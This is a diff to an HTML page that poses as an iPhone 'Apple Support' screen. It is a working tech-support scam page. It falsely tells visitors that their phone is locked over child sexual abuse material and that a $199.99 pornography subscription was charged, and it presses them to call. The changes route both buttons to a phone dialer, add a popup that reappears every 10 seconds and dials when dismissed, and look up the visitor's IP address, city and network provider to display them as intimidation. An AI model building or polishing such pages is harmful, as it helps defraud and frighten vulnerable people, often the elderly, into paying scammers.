@@ -2,114 +2,122 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>iPhone UI Demo - Settings Style</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>iPhone UI Demo - Fullscreen</title>
 
 <style>
+    :root {
+        --vh: 100vh;
+    }
+
+    @supports (-webkit-touch-callout: none) {
+        body {
+            height: calc(var(--vh) * 100);
+        }
+    }
+
     body {
         margin: 0;
         padding: 0;
         font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-        background: url('https://content.jdmagicbox.com/v2/comp/pune/n4/020pxx20.xx20.250826161117.a8n4/catalogue/apple-store-kopa-mall-koregaon-park-pune-mobile-phone-dealers-fjxrl6t6th.jpg') no-repeat center center;
-        background-size: cover;
+        background: #f2f2f7;
         height: 100vh;
         width: 100vw;
         display: flex;
         justify-content: center;
-        align-items: center;
+        align-items: flex-start;
+        overflow: hidden;
+        font-size: 22px; /* GLOBAL FONT SIZE LARGER */
     }
 
-    /* iPhone frame */
     .iphone {
-        width: 390px;
-        max-width: 100%;
+        width: 100%;
+        height: 100%;
+        max-width: 430px;
         background: #f2f2f7;
-        border-radius: 30px;
-        overflow: hidden;
-        box-shadow: 0 0 30px rgba(0,0,0,0.6);
-        border: 4px solid #111;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+        padding-bottom: env(safe-area-inset-bottom);
     }
 
     .safari-bar {
         background: #f2f2f7;
-        padding: 12px;
+        padding: 14px;
         text-align: center;
         border-bottom: 1px solid #d1d1d6;
-        font-size: 14px;
+        font-size: 20px;
         color: #666;
+        padding-top: env(safe-area-inset-top);
     }
 
     .url-box {
         background: white;
-        border-radius: 10px;
-        padding: 6px 10px;
+        border-radius: 12px;
+        padding: 10px 14px;
         border: 1px solid #ccc;
         display: inline-block;
         min-width: 70%;
-        font-size: 13px;
+        font-size: 19px;
         color: #333;
     }
 
     .content {
-        padding: 22px;
+        padding: 26px;
+        font-size: 22px;
     }
 
-    /* SETTINGS CARD */
     .settings-card {
         background: #ffffff;
-        border-radius: 16px;
+        border-radius: 20px;
         overflow: hidden;
         box-shadow: 0 6px 18px rgba(0,0,0,0.07);
         border: 1px solid #e5e5e7;
-        margin-top: 10px;
+        margin-top: 14px;
     }
 
     .settings-header {
         display: flex;
         align-items: center;
-        padding: 16px;
-        font-size: 18px;
-        font-weight: 600;
+        padding: 20px;
+        font-size: 26px;
+        font-weight: 700;
         color: #111;
-        background: #fff;
     }
 
     .settings-header img {
-        width: 32px;
-        margin-right: 12px;
+        width: 40px;
+        margin-right: 14px;
     }
 
     .settings-divider {
         height: 1px;
         background: #e5e5ea;
         width: 100%;
-        margin: 0;
     }
 
     .settings-body {
-        padding: 16px;
-        font-size: 15px;
-        line-height: 1.45;
+        padding: 20px;
+        font-size: 22px;
+        line-height: 1.6;
         color: #333;
     }
 
-    /* Buttons */
     .button-row {
-        margin-top: 18px;
+        margin-top: 24px;
         display: flex;
         flex-direction: column;
-        gap: 10px;
+        gap: 14px;
     }
 
     .btn {
         display: block;
         width: 100%;
         text-align: center;
-        padding: 14px 0;
-        border-radius: 12px;
-        font-size: 17px;
+        padding: 18px 0;
+        border-radius: 14px;
+        font-size: 24px;
         text-decoration: none;
-        font-weight: 600;
+        font-weight: 700;
     }
 
     .cancel-btn {
@@ -125,40 +133,39 @@
 
     @keyframes pulse {
         0% { box-shadow: 0 0 0 0 rgba(0,122,255,0.45); }
-        70% { box-shadow: 0 0 14px 8px rgba(0,122,255,0); }
+        70% { box-shadow: 0 0 18px 8px rgba(0,122,255,0); }
         100% { box-shadow: 0 0 0 0 rgba(0,122,255,0); }
     }
 
     .disclaimer {
-        font-size: 11px;
+        font-size: 18px;
         color: #888;
-        margin-top: 16px;
+        margin-top: 20px;
         text-align: center;
     }
 
-    /* Loop alert */
     #loopAlertOverlay {
         display:none;
         position:fixed;
         inset:0;
         background:rgba(0,0,0,0.35);
         backdrop-filter:blur(6px);
-        -webkit-backdrop-filter:blur(6px);
         justify-content:center;
         align-items:center;
         z-index:9999;
     }
 
     #loopAlertBox {
-        width:80%;
-        max-width:300px;
+        width:85%;
+        max-width:340px;
         background:white;
-        border-radius:14px;
+        border-radius:16px;
         text-align:center;
-        padding-top:18px;
+        padding-top:22px;
         opacity:0;
         transform:scale(1.1);
         animation:loopPop .25s forwards;
+        font-size: 22px;
     }
 
     @keyframes loopPop {
@@ -167,23 +174,21 @@
     }
 
     .loop-title {
-        font-size:18px;
-        font-weight:600;
-        color:#111;
-        margin-bottom:6px;
+        font-size: 26px;
+        font-weight: 700;
+        margin-bottom: 10px;
     }
 
     .loop-msg {
-        font-size:14px;
-        color:#444;
-        padding:0 20px 20px;
-        line-height:1.4;
+        font-size: 22px;
+        padding: 0 24px 24px;
+        line-height: 1.5;
     }
 
     .loop-buttonbar {
         border-top:1px solid #d0d0d0;
         display:flex;
-        height:44px;
+        height:54px;
     }
 
     .loop-buttonbar div {
@@ -192,7 +197,7 @@
         justify-content:center;
         align-items:center;
         color:#007aff;
-        font-size:17px;
+        font-size:24px;
         cursor:pointer;
     }
 </style>
@@ -208,39 +213,34 @@
 
     <div class="content">
 
-        <!-- SETTINGS STYLE CARD -->
         <div class="settings-card">
-
             <div class="settings-header">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Settings_%28iOS%29.png/250px-Settings_%28iOS%29.png" alt="icon">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ea/Settings_%28iOS%29.png/250px-Settings_%28iOS%29.png">
                 Apple Support
             </div>
-
             <div class="settings-divider"></div>
-
             <div class="settings-body">
-                Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it
+                Loading your details...
             </div>
         </div>
 
         <div class="button-row">
-            <a href="#" class="btn cancel-btn">Cancel</a>
+            <a href="tel:0000000000" class="btn cancel-btn">Cancel</a>
             <a href="tel:0000000000" class="btn call-btn">Call Now</a>
         </div>
 
-        <div class="disclaimer">Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it</div>
+        <div class="disclaimer">
+           
+        </div>
 
     </div>
 </div>
 
-<!-- Loop alert -->
+<!-- Popup -->
 <div id="loopAlertOverlay">
     <div id="loopAlertBox">
         <div class="loop-title">Apple Support</div>
-        <div class="loop-msg">
-            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it
-        </div>
-
+        <div class="loop-msg">Loading...</div>
         <div class="loop-buttonbar">
             <div id="loopCloseBtn">OK</div>
         </div>
@@ -248,10 +248,21 @@
 </div>
 
 <script>
-// Loop alert triggers call when OK pressed
 let loopTimer = null;
 
+/* Rotating popup messages */
+const alertMessages = [
+    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
+    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
+    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.",
+    "Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it."
+];
+
+let currentIndex = 0;
+
 function showLoopAlert() {
+    document.querySelector(".loop-msg").textContent = alertMessages[currentIndex];
+    currentIndex = (currentIndex + 1) % alertMessages.length;
     document.getElementById("loopAlertOverlay").style.display = "flex";
 }
 
@@ -260,19 +271,70 @@ function hideLoopAlertAndCall() {
 
     navigator.vibrate?.([6, 12, 6]);
 
-    // Placeholder number
     window.location.href = "tel:0000000000";
 
     clearTimeout(loopTimer);
+
     loopTimer = setTimeout(showLoopAlert, 10000);
 }
 
 document.getElementById("loopCloseBtn").onclick = hideLoopAlertAndCall;
 
-// Start after 10 second
 window.onload = function() {
-    setTimeout(showLoopAlert, 1000);
+    loopTimer = setTimeout(showLoopAlert, 10000);
 };
+
+/* ---- IP + Location + Carrier Detection ---- */
+async function detectIPandLocation() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+
+        const ip = data.ip;
+        const city = data.city;
+        const region = data.region;
+        const country = data.country_name;
+        const isp = data.org;
+
+        let carrier = "Unknown";
+
+        const carriers = [
+            "Verizon", "AT&T", "T-Mobile", "Sprint", "US Cellular",
+            "Vodafone", "Orange", "O2", "Three", "Rogers", "Telus", "Bell"
+        ];
+
+        for (const c of carriers) {
+            if (isp && isp.toLowerCase().includes(c.toLowerCase())) {
+                carrier = c;
+                break;
+            }
+        }
+
+        if (carrier === "Unknown" && isp) {
+            carrier = "WiFi Network";
+        }
+
+        const body = document.querySelector(".settings-body");
+        body.innerHTML = `
+            <strong>Your IP:</strong> ${ip}<br>
+            <strong>Location:</strong> ${city}, ${region}, ${country}<br>
+            <strong>Network Provider:</strong> ${isp}<br>
+            <strong>Carrier (Detected):</strong> ${carrier}<br><br>
+            Your iPhone has been locked due to illegal child pornography activity on your device. Your Purchase Of $199.99 for pornhub subscription via apple id is complete if not you call support asap to cancel it.
+        `;
+    } catch (err) {
+        console.error("Location error:", err);
+    }
+}
+
+window.addEventListener("load", detectIPandLocation);
+/* -------------------------------------- */
+
+function updateVH() {
+    document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
+}
+window.addEventListener('resize', updateVH);
+updateVH();
 </script>
 
 </body>
